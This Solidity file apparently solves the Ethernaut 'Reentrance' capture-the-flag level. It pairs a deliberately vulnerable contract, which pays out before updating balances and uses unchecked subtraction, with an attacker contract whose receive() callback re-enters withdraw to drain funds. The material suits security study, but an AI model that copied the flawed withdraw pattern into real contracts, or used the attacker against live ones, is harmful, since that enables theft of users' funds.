// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-solidity/contracts/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;
    mapping(address => uint) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint balance) {
        return balances[_who];
    }

    function withdraw(uint _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract Reentrance_Attacker {
    Reentrance reEntrance;

    constructor(address payable _reEntranceAddress) public {
        reEntrance = Reentrance(_reEntranceAddress);
    }

    function attack() external payable {
        reEntrance.donate{value: msg.value}(address(this));
        reEntrance.withdraw(msg.value);
    }

    receive() external payable {
        if (address(reEntrance).balance > 0) {
            reEntrance.withdraw(msg.value);
        }
    }
}
